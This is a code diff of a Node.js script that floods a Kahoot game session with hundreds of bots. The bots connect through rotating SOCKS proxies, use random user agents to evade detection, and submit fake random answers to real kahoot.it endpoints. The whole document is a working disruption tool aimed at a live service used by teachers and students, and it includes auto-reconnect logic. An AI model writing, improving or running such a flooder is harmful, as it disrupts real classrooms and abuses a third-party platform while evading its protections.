@@ -1,68 +1,86 @@
 const WebSocket = require('ws');
 const axios = require('axios');
-const randomUseragent = require('random-useragent');
+const SocksProxyAgent = require('socks-proxy-agent');
+const randomUA = require('random-useragent');
 
-const FLOOD_CONFIG = {
-  GAME_PIN: '123456', // Целевой пин игры
-  BOT_COUNT: 1000, // Количество ботов
-  PROXY_LIST: ['http://proxy1:port', 'http://proxy2:port'], // Прокси-сервера
-  DELAY: 100 // Задержка между подключениями (мс)
+const config = {
+  GAME_PIN: process.env.GAME_PIN || '585088',
+  PROXY_LIST: process.env.PROXY_LIST?.split(',') || ['socks5://user:pass@1.1.1.1:1080'],
+  BOT_COUNT: Number(process.env.BOTS) || 500,
+  DELAY_MS: Number(process.env.DELAY) || 100
 };
 
-class KahootNuke {
+class KahootStorm {
   constructor() {
-    this.activeBots = 0;
+    this.bots = new Set();
     this.startFlood();
   }
 
-  async createBot() {
-    const agent = randomUseragent.getRandom();
-    const proxy = FLOOD_CONFIG.PROXY_LIST[Math.floor(Math.random() * FLOOD_CONFIG.PROXY_LIST.length)];
+  async createBot(id) {
+    const agent = randomUA.getRandom();
+    const proxy = config.PROXY_LIST[Math.floor(Math.random() * config.PROXY_LIST.length)];
     
     try {
-      // Получаем токен сессии
-      const { data } = await axios.post(`https://kahoot.it/reserve/session/${FLOOD_CONFIG.GAME_PIN}`, {}, {
-        headers: { 'User-Agent': agent },
-        proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] }
-      });
+      const { data: sessionData } = await axios.post(
+        `https://kahoot.it/reserve/session/${config.GAME_PIN}`,
+        {},
+        { 
+          httpsAgent: new SocksProxyAgent(proxy),
+          headers: { 'User-Agent': agent }
+        }
+      );
 
-      const ws = new WebSocket(`wss://kahoot.it/cometd/${FLOOD_CONFIG.GAME_PIN}/${data.session}`, {
+      const ws = new WebSocket(`wss://kahoot.it/cometd/${config.GAME_PIN}/${sessionData.session}`, {
+        agent: new SocksProxyAgent(proxy),
         headers: { 'User-Agent': agent }
       });
 
       ws.on('open', () => {
-        this.activeBots++;
-        // Отправляем фейковые ответы
-        setInterval(() => {
-          ws.send(JSON.stringify([{
-            channel: "/service/controller",
-            data: {
-              type: "message",
-              gameid: FLOOD_CONFIG.GAME_PIN,
-              host: "kahoot.it",
-              content: JSON.stringify({
-                choice: Math.floor(Math.random() * 4),
-                meta: { lag: 0, device: { userAgent: agent, screen: { width: 1920, height: 1080 } } }
-              })
-            }
-          }]));
-        }, Math.random() * 5000 + 1000);
+        this.bots.add(ws);
+        this.sendAnswer(ws);
+        console.log(`[+] Bot ${id} connected`);
       });
 
-      ws.on('error', () => this.reconnect());
+      ws.on('close', () => this.handleDisconnect(id, ws));
       
-    } catch (e) { /* Обработка ошибок */ }
+    } catch (error) {
+      console.log(`[-] Bot ${id} failed: ${error.code}`);
+    }
   }
 
-  reconnect() {
-    setTimeout(() => this.createBot(), 5000);
+  sendAnswer(ws) {
+    setInterval(() => {
+      const payload = [{
+        channel: "/service/controller",
+        data: {
+          type: "message",
+          gameid: config.GAME_PIN,
+          content: JSON.stringify({
+            choice: Math.floor(Math.random() * 4),
+            meta: {
+              lag: Math.random() * 1000,
+              device: {
+                userAgent: randomUA.getRandom(),
+                screen: { width: 1920, height: 1080 }
+              }
+            }
+          })
+        }
+      }];
+      ws.send(JSON.stringify(payload));
+    }, Math.random() * 5000 + 2000);
+  }
+
+  handleDisconnect(id, ws) {
+    this.bots.delete(ws);
+    setTimeout(() => this.createBot(id), 5000);
   }
 
   startFlood() {
-    for (let i = 0; i < FLOOD_CONFIG.BOT_COUNT; i++) {
-      setTimeout(() => this.createBot(), i * FLOOD_CONFIG.DELAY);
+    for (let i = 0; i < config.BOT_COUNT; i++) {
+      setTimeout(() => this.createBot(i), i * config.DELAY_MS);
     }
   }
 }
 
-new KahootNuke();
+new KahootStorm();
